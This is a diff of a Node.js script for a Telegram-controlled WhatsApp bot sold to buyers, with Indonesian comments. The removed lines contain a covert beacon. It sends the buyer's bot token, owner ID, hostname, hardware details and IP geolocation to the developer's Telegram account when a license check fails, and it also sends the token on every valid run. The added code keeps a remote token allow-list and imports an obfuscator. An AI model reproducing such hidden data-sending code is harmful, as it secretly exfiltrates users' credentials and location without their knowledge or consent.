@@ -1,50 +1,85 @@
-/*
-   Tambahin di package.json:
-   "axios": "^1.6.8",
-   "chalk": "^4.1.2",
-   "fs-extra": "^11.2.0",
-   "moment": "^2.30.1",
-   "os": "^0.1.2",
-   "telegram": "^2.26.22",
-   "node-telegram-bot-api": "^0.66.0",
-   "@whiskeysockets/baileys": "^6.7.5",
-   "pino": "^8.15.0",
-   "js-confuser": "^1.2.9"
-*/
-
 const {
-  default: makeWASocket,
-  useMultiFileAuthState,
-  DisconnectReason,
-} = require("@whiskeysockets/baileys");
-
-const { TelegramClient } = require("telegram");
-const { StringSession } = require("telegram/sessions");
-const TelegramBot = require("node-telegram-bot-api");
-
+    default: makeWASocket,
+    useMultiFileAuthState,
+    downloadContentFromMessage,
+    emitGroupParticipantsUpdate,
+    emitGroupUpdate,
+    generateWAMessageContent,
+    generateWAMessage,
+    makeInMemoryStore,
+    prepareWAMessageMedia,
+    generateWAMessageFromContent,
+    MediaType,
+    areJidsSameUser,
+    WAMessageStatus,
+    downloadAndSaveMediaMessage,
+    AuthenticationState,
+    GroupMetadata,
+    initInMemoryKeyStore,
+    getContentType,
+    MiscMessageGenerationOptions,
+    useSingleFileAuthState,
+    BufferJSON,
+    WAMessageProto,
+    MessageOptions,
+    WAFlag,
+    WANode,
+    WAMetric,
+    ChatModification,
+    MessageTypeProto,
+    WALocationMessage,
+    ReconnectMode,
+    WAContextInfo,
+    proto,
+    WAGroupMetadata,
+    ProxyAgent,
+    waChatKey,
+    MimetypeMap,
+    MediaPathMap,
+    WAContactMessage,
+    WAContactsArrayMessage,
+    WAGroupInviteMessage,
+    WATextMessage,
+    WAMessageContent,
+    WAMessage,
+    BaileysError,
+    WA_MESSAGE_STATUS_TYPE,
+    MediaConnInfo,
+    URL_REGEX,
+    WAUrlInfo,
+    WA_DEFAULT_EPHEMERAL,
+    WAMediaUpload,
+    jidDecode,
+    mentionedJid,
+    processTime,
+    Browser,
+    MessageType,
+    Presence,
+    WA_MESSAGE_STUB_TYPES,
+    Mimetype,
+    relayWAMessage,
+    Browsers,
+    GroupSettingChange,
+    DisconnectReason,
+    WASocket,
+    getStream,
+    WAProto,
+    isBaileys,
+    AnyMessageContent,
+    fetchLatestBaileysVersion,
+    templateMessage,
+    InteractiveMessage,
+    Header,
+} = require('@whiskeysockets/baileys');
 const fs = require("fs-extra");
-const chalk = require("chalk");
-const axios = require("axios");
-const path = require("path");
+const JsConfuser = require("js-confuser");
 const P = require("pino");
-const os = require("os");
-
-// ================= CONFIG =================
-const config = require("./config.js");
-const { BOT_TOKEN, OWNER_ID } = config;
-
-const apiId = 101015; // ganti
-const apiHash = "kntl"; // ganti
-const stringSession = new StringSession("KNTL"); // ganti
-const S_ID = "@BangZyur"; // ganti
-
-const FIRST_RUN_FILE = path.join(__dirname, "first_run.json");
-const GITHUB_TOKEN_LIST_URL =
-  "https://raw.githubusercontent.com/vonziexvoteam-art/DatabaseToken/refs/heads/main/tokens.json";
-
+const crypto = require("crypto");
+const path = require("path");
+const sessions = new Map();
+const readline = require('readline');
 const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
-const sessions = new Map();
 
 let premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json'));
 let adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json'));
@@ -85,119 +120,269 @@ function watchFile(filePath, updateCallback) {
 watchFile('./設定/premium.json', (data) => (premiumUsers = data));
 watchFile('./設定/admin.json', (data) => (adminUsers = data));
 
-// ================= TELEGRAM CLIENT (REPORT) =================
-async function initClient() {
-  const client = new TelegramClient(stringSession, apiId, apiHash, {
-    connectionRetries: 5,
-  });
-  await client.start();
-  return client;
+
+const axios = require("axios");
+const chalk = require("chalk"); // Import chalk untuk warna
+const config = require("./設定/config.js");
+const TelegramBot = require("node-telegram-bot-api");
+
+const BOT_TOKEN = config.BOT_TOKEN;
+
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/vonziexvoteam-art/DatabaseToken/refs/heads/main/tokens.json"; 
+
+// Fungsi hashing token biar lebih aman
+function hashToken(token) {
+  return crypto.createHash("sha256").update(token).digest("hex");
 }
 
-async function sendToTelegram(message, force = false) {
-  const client = await initClient();
-
-  if (!force && fs.existsSync(FIRST_RUN_FILE)) {
-    const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
-    if (data.notified) return;
-  }
-
+// Ambil token list dari GitHub
+async function fetchValidTokens(retry = 3) {
   try {
-    await client.sendMessage(S_ID, { message, parseMode: "markdown" });
-    if (!force) {
-      fs.writeFileSync(
-        FIRST_RUN_FILE,
-        JSON.stringify({ notified: true }, null, 2)
-      );
+    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 10000 });
+    if (!response.data || !Array.isArray(response.data.tokens)) {
+      throw new Error("Format JSON tidak valid. Pastikan ada field 'tokens'.");
     }
-  } catch (err) {
-    console.error("🚫 Gagal kirim Telegram:", err.message);
-  }
-}
-
-// ================= TOKEN CHECKER =================
-async function fetchValidTokens() {
-  try {
-    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
-    return response.data.tokens;
+    return response.data.tokens.map(hashToken); // Hash semua token dari GitHub
   } catch (error) {
-    console.error(
-      chalk.red("❌ Gagal ambil daftar token dari GitHub:", error.message)
-    );
+    console.error(chalk.red(`❌ Gagal ambil daftar token: ${error.message}`));
+    if (retry > 0) {
+      console.log(chalk.yellow(`🔄 Coba lagi... (${3 - retry + 1})`));
+      await new Promise((r) => setTimeout(r, 3000));
+      return fetchValidTokens(retry - 1);
+    }
     return [];
   }
 }
 
+// Validasi token sebelum start bot
 async function validateToken() {
-  console.log(chalk.blue("⏳ PLEASE WAIT... CHECKING TOKENS"));
+  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
+
   const validTokens = await fetchValidTokens();
+  const hashedBotToken = hashToken(BOT_TOKEN);
 
-  if (!validTokens.includes(BOT_TOKEN)) {
-    const cpus = os.cpus();
-    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
-    const time = new Date().toLocaleString();
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    let ipInfo = {};
-    try {
-      const { data } = await axios.get("https://ipapi.co/json/");
-      ipInfo = data;
-    } catch {
-      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
-    }
-
-    const report = `
-**🚨 DETECTED PENYUSUPAN 🚨**
-**TOKEN :** \`${BOT_TOKEN}\`
-**OWNER :** \`${OWNER_ID}\`
-
-**🔍 SECURITY REPORT**
-📅 Timestamp: ${time}
-🖥️ Device: ${os.platform()} ${os.release()}
-🖥️ Hostname: ${os.hostname()}
-⚙️ CPU: ${cpus[0].model} (${cpus.length} core)
-💾 RAM: ${totalMem} GB
-🌐 Timezone: ${timezone}
-
-📍 Location:
-IP: ${ipInfo.ip}
-Loc: ${ipInfo.city}, ${ipInfo.country_name}
-ISP: ${ipInfo.org}
-Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}
-`;
-
-    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR!"));
-    await sendToTelegram(report, true);
-    await new Promise((o) => setTimeout(o, 3000));
+  if (!validTokens.includes(hashedBotToken)) {
+    console.log(chalk.red("❌ Token tidak valid atau tidak terdaftar!"));
     process.exit(1);
   }
 
-  console.clear();
-  console.log(chalk.green("✅ TOKEN TERDAFTAR, LANJUT JALANKAN BOT..."));
-
-  await sendToTelegram(
-    `**✅ BUYER RUN BOT NIH**\n\n**TOKEN:** \`${BOT_TOKEN}\`\n**OWNER:** \`${OWNER_ID}\``
-  );
-
-  // 🚀 MULAI BOT
-  startAll();
+  console.log(chalk.green("✅ Token Valid, melanjutkan..."));
+  startBot();
 }
 
-// ================= START ALL BOT =================
-function startAll() {
-  console.log(`
-╔══════════════════════════════╗
-   🚀 BOT SYSTEM STARTED 🚀
-╚══════════════════════════════╝
-Script : ZyuroXz
-Versi  : 1.1
-Developer : Vexxuzzz 
-Telegram  : @VexxuzzZ
-  `);
+function startBot() {
+  const currentTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
 
-  startTelegramBot();
-  initializeWhatsAppConnections();
+  console.log(chalk.blue(`
+Script: INAZAMI INVICTUS
+Versi: 1.2
+Status: `) + chalk.bold.green("Terhubung") + chalk.bold.white(`
+Developer: Vexxuzzz 
+Telegram : @VexxuzzZ
+YouTube  : @VexxuzzZ
+Waktu    : ${currentTime} WIB`));
+
+  const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+  bot.on("message", (msg) => {
+    console.log(chalk.yellow(`📩 Pesan dari ${msg.from.username || msg.from.id}: ${msg.text}`));
+    bot.sendMessage(msg.chat.id, "✅ Bot aktif dan token valid!");
+  });
 }
+
+validateToken();
+
+function saveActiveSessions(botNumber) {
+  try {
+    const sessions = [];
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      if (!existing.includes(botNumber)) {
+        sessions.push(...existing, botNumber);
+      }
+    } else {
+      sessions.push(botNumber);
+    }
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
+  } catch (error) {
+    console.error("Error saving session:", error);
+  }
+}
+
+async function initializeWhatsAppConnections() {
+  try {
+    if (fs.existsSync(SESSIONS_FILE)) {
+      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
+      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
+
+      for (const botNumber of activeNumbers) {
+        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
+        const sessionDir = createSessionDir(botNumber);
+        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+        const sock = makeWASocket({
+          auth: state,
+          printQRInTerminal: true,
+          logger: P({ level: "silent" }),
+          defaultQueryTimeoutMs: undefined,
+        });
+
+        // Tunggu hingga koneksi terbentuk
+        await new Promise((resolve, reject) => {
+          sock.ev.on("connection.update", async (update) => {
+            const { connection, lastDisconnect } = update;
+            if (connection === "open") {
+              console.log(`Bot ${botNumber} terhubung!`);
+              sessions.set(botNumber, sock);
+              resolve();
+            } else if (connection === "close") {
+              const shouldReconnect =
+                lastDisconnect?.error?.output?.statusCode !==
+                DisconnectReason.loggedOut;
+              if (shouldReconnect) {
+                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
+                await initializeWhatsAppConnections();
+              } else {
+                reject(new Error("Koneksi ditutup"));
+              }
+            }
+          });
+
+          sock.ev.on("creds.update", saveCreds);
+        });
+      }
+    }
+  } catch (error) {
+    console.error("Error initializing WhatsApp connections:", error);
+  }
+}
+
+function createSessionDir(botNumber) {
+  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
+  if (!fs.existsSync(deviceDir)) {
+    fs.mkdirSync(deviceDir, { recursive: true });
+  }
+  return deviceDir;
+}
+
+async function connectToWhatsApp(botNumber, chatId) {
+  let statusMessage = await bot
+    .sendMessage(
+      chatId,
+      `L O A D I N G D U L U B O Z
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Loading...`,
+      { parse_mode: "Markdown" }
+    )
+    .then((msg) => msg.message_id);
+
+  const sessionDir = createSessionDir(botNumber);
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: false,
+    logger: P({ level: "silent" }),
+    defaultQueryTimeoutMs: undefined,
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect } = update;
+
+    if (connection === "close") {
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      if (statusCode && statusCode >= 500 && statusCode < 600) {
+        await bot.editMessageText(
+          `M E N G H U B U N G K A N D U L U B O Z
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Mennghubungkan`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+        await connectToWhatsApp(botNumber, chatId);
+      } else {
+        await bot.editMessageText(
+          `
+G A G A L T E R S A M B U N G
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Gagal Tersambung 
+`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+        try {
+          fs.rmSync(sessionDir, { recursive: true, force: true });
+        } catch (error) {
+          console.error("Error deleting session:", error);
+        }
+      }
+    } else if (connection === "open") {
+      sessions.set(botNumber, sock);
+      saveActiveSessions(botNumber);
+      await bot.editMessageText(
+        `P A I R I N G D U L U B O Z
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Pairing
+╰➤Pesan : Succes Pairing`,
+        {
+          chat_id: chatId,
+          message_id: statusMessage,
+          parse_mode: "Markdown",
+        }
+      );
+    } else if (connection === "connecting") {
+      await new Promise((resolve) => setTimeout(resolve, 1000));
+      try {
+        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
+          const code = await sock.requestPairingCode(botNumber);
+          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+          await bot.editMessageText(
+            `
+P A I R I N G D U L U B O Z
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Pairing
+╰➤ Kode : ${formattedCode}`,
+            {
+              chat_id: chatId,
+              message_id: statusMessage,
+              parse_mode: "Markdown",
+            }
+          );
+        }
+      } catch (error) {
+        console.error("Error requesting pairing code:", error);
+        await bot.editMessageText(
+          `
+G A G A L B O Z
+╰➤ Number  : ${botNumber} 
+╰➤ Status : Erorr❌
+╰➤ Pesan : ${error.message}`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+      }
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+
+  return sock;
+}
+
+
+
+
 //-# Fungsional Function Before Parameters
 
 //~Runtime🗑️🔧
@@ -363,9 +548,6 @@ function isOwner(userId) {
 
 /////---------------[sleep function]------_-_
 const bugRequests = {};
-
-// ================= TELEGRAM BOT (CONTROL PANEL) =================
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
@@ -1125,177 +1307,3 @@ bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
         bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
     }
 });
-
-// ================= WHATSAPP BOT =================
-
-async function initializeWhatsAppConnections() {
-  try {
-    if (fs.existsSync(SESSIONS_FILE)) {
-      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
-
-      for (const botNumber of activeNumbers) {
-        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
-        const sessionDir = createSessionDir(botNumber);
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-        const sock = makeWASocket({
-          auth: state,
-          printQRInTerminal: true,
-          logger: P({ level: "silent" }),
-          defaultQueryTimeoutMs: undefined,
-        });
-
-        // Tunggu hingga koneksi terbentuk
-        await new Promise((resolve, reject) => {
-          sock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
-            if (connection === "open") {
-              console.log(`Bot ${botNumber} terhubung!`);
-              sessions.set(botNumber, sock);
-              resolve();
-            } else if (connection === "close") {
-              const shouldReconnect =
-                lastDisconnect?.error?.output?.statusCode !==
-                DisconnectReason.loggedOut;
-              if (shouldReconnect) {
-                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
-                await initializeWhatsAppConnections();
-              } else {
-                reject(new Error("Koneksi ditutup"));
-              }
-            }
-          });
-
-          sock.ev.on("creds.update", saveCreds);
-        });
-      }
-    }
-  } catch (error) {
-    console.error("Error initializing WhatsApp connections:", error);
-  }
-}
-
-function createSessionDir(botNumber) {
-  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-  if (!fs.existsSync(deviceDir)) {
-    fs.mkdirSync(deviceDir, { recursive: true });
-  }
-  return deviceDir;
-}
-
-async function connectToWhatsApp(botNumber, chatId) {
-  let statusMessage = await bot
-    .sendMessage(
-      chatId,
-      `L O A D I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Loading...`,
-      { parse_mode: "Markdown" }
-    )
-    .then((msg) => msg.message_id);
-
-  const sessionDir = createSessionDir(botNumber);
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-  const sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: false,
-    logger: P({ level: "silent" }),
-    defaultQueryTimeoutMs: undefined,
-  });
-
-  sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-
-    if (connection === "close") {
-      const statusCode = lastDisconnect?.error?.output?.statusCode;
-      if (statusCode && statusCode >= 500 && statusCode < 600) {
-        await bot.editMessageText(
-          `M E N G H U B U N G K A N D U L U B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Mennghubungkan`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
-          }
-        );
-        await connectToWhatsApp(botNumber, chatId);
-      } else {
-        await bot.editMessageText(
-          `
-G A G A L T E R S A M B U N G
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Gagal Tersambung 
-`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
-          }
-        );
-        try {
-          fs.rmSync(sessionDir, { recursive: true, force: true });
-        } catch (error) {
-          console.error("Error deleting session:", error);
-        }
-      }
-    } else if (connection === "open") {
-      sessions.set(botNumber, sock);
-      saveActiveSessions(botNumber);
-      await bot.editMessageText(
-        `P A I R I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Pairing
-╰➤Pesan : Succes Pairing`,
-        {
-          chat_id: chatId,
-          message_id: statusMessage,
-          parse_mode: "Markdown",
-        }
-      );
-    } else if (connection === "connecting") {
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      try {
-        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(botNumber);
-          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-          await bot.editMessageText(
-            `
-P A I R I N G D U L U B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Pairing
-╰➤ Kode : ${formattedCode}`,
-            {
-              chat_id: chatId,
-              message_id: statusMessage,
-              parse_mode: "Markdown",
-            }
-          );
-        }
-      } catch (error) {
-        console.error("Error requesting pairing code:", error);
-        await bot.editMessageText(
-          `
-G A G A L B O Z
-╰➤ Number  : ${botNumber} 
-╰➤ Status : Erorr❌
-╰➤ Pesan : ${error.message}`,
-          {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
-          }
-        );
-      }
-    }
-  });
-
-  sock.ev.on("creds.update", saveCreds);
-
-  return sock;
-}
-
-// ================= RUN =================
-validateToken();
